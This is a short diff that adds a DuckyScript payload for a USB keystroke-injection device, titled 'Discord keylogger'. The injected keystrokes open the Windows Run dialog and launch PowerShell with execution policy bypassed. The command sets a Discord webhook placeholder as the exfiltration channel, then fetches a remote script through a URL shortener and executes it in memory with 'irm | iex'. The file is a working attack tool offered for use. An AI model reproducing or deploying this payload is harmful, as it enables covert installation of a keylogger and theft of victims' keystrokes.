@@ -1,0 +1,11 @@
+REM Discord keylogger
+
+DUCKY_LANG NO
+DELAY 800
+CAPSLOCK_DISABLE
+
+GUI r
+DELAY 300
+STRING powershell -NonI -NoP -Ep bypass -c "$dc = 'your discord webhook here' ; irm https://shorturl.at/npJOS | iex"
+DELAY 100
+ENTER
